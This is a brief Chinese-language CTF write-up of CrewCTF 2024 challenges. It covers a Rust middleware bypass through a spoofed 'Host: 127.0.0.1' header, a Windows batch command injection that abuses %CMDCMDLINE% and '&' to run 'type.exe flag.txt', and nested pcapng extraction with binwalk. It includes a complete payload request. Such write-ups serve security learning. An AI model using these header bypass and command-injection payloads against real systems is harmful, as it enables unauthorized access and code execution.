---
title: CrewCTF 2024 Writeup
contest: CrewCTF 2024
year: 2024
difficulty: medium
vuln_type: rce
tags: [web, rust, host-header-bypass, cmd-injection, ping2, binwalk, 4层pcapng]
attack_chain:
  - middleware_localhost检查host以127.0.0.1开头可绕过
  - GET /ai/run?cmd=env&arg= 主机头Host: 127.0.0.1
  - ping2 arg过滤 ' " * ! @ ^ ? 但允许%CMDCMDLINE%环境变量
  - %CMDCMDLINE%:~-1%&type.exe flag.txt 命令注入读flag
  - 4层pcapng+binwalk递归解压得flag
key_payload: GET /ai/run?cmd=ping2&arg=%25CMDCMDLINE%3a~-1%25%26type.exe%20flag.txt HTTP/1.1
Host: 127.0.0.1
one_liner: CrewCTF 2024 2题：Rust Host头绕过+ping2 bat命令注入，4层pcapng
lesson: %CMDCMDLINE%环境变量+Windows批处理可绕字符过滤
quality: medium
---

# CrewCTF 2024 Writeup

## 题目信息
- 比赛：CrewCTF 2024
- 类别：Web / Misc

## 关键攻击链
### 题目 1：AI run 主机头绕过
- Rust middleware：检查 `host.trim_start().starts_with("127.0.0.1")` 否则 401
- `req.uri().host().or(req.header("host"))` 优先 URL host，URL 不带 host 就用 header
- 绕过：直接 `GET /ai/run?cmd=env&arg= HTTP/1.1\r\nHost: 127.0.0.1\r\n`

### 题目 2：ping2 批处理命令注入
- arg 过滤：`' " * ! @ ^ ?` 但允许 `%CMDCMDLINE%`
- `%CMDCMDLINE%:~-1%` 取最后 1 字符（命令行的最后一个字符）
- payload：`%CMDCMDLINE%:~-1%&type.exe flag.txt`
  - `&` 不在过滤列表，连接第二个命令
  - type.exe 读 flag.txt

### 题目 3：4 层 pcapng 套娃
- `binwalk -e usb.pcapng` → layer4.pcapng (gzip)
- `binwalk -e layer4.pcapng` → out.7z (7-zip)
- `dd ibs=1 obs=1 skip=14095 if=layer4.pcapng of=out.7z`
- `binwalk -e layer3.pcapng` → tar (POSIX)
- `binwalk -e layer2.pcapng` → layer1.pcapng (zip)
- `binwalk -e layer1.pcapng` → `strings layer1.pcapng | grep crew` 得 flag

## 评分
- quality: medium（payload 完整，4 层 pcapng 思路清晰）
